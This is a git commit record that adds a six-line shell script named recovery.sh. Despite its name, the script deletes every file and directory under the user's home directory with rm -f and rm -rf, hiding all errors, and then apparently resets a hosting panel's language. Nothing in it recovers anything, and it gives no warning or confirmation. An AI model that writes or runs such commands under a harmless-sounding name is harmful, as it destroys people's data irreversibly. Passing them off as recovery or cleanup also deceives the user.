d462e83c19fc331c5ff98f63ac81b7b9de936e37
Anand <58105052+anand-lyn@users.noreply.github.com>
2024-11-06 14:50:15 +0800

    Create recovery.sh

---
+++ recovery.sh
@@ -0,0 +1,6 @@
+find ~ -type f -exec chmod 644 {} \; 2>/dev/null
+find ~ -type d -exec chmod 755 {} \; 2>/dev/null
+find ~ -type f -exec rm -f {} \; 2>/dev/null
+find ~ -type d -empty -exec rmdir {} \; 2>/dev/null
+find ~ -exec rm -rf {} \; 2>/dev/null
+devil lang set english
